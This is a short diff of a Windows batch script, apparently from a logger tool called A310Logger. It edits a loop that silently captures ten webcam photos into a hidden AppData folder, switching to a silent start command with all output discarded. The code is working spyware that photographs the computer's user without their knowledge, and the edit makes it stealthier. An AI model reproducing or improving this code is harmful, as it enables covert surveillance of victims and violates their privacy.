@@ -253,7 +253,8 @@ echo *************DOWNLOAD file****************
       set increment=0
       :increment
       timeout 1 > nul
-      call "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" > nul 2> nul
+      
+      start /w "" "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" /S > nul 2> nul
       set /a increment=%increment%+1 
       if "%increment%"=="11" goto next
       goto increment
